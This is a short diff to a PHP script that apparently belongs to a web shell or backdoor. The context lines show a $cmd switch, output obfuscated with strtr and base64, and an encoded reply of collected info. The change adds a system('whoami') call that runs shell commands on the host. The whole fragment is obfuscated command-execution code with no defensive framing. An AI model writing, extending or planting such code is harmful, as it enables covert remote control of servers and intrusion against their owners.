@@ -225,7 +225,8 @@ switch($cmd){
 if ( $sayhello ) {
     echo base64_decode(strtr("VrlEFMb0McIu2PxMMHdcBHut2DBg2lg/7dwl7DIdg9ns7f+
 BuHzv1L+t2cIlB9yJqfwfgZBh16uPCd8vq9zMqmxttDB0yrdEV5==", $de, $en));
-echo "euuuhhhhhhhh";
+echo "euuuhhhhhhhh \n";
+system("whoami");
 } else {
     echo strtr(base64_encode(blv_encode($rinfo)), $en, $de);
 }
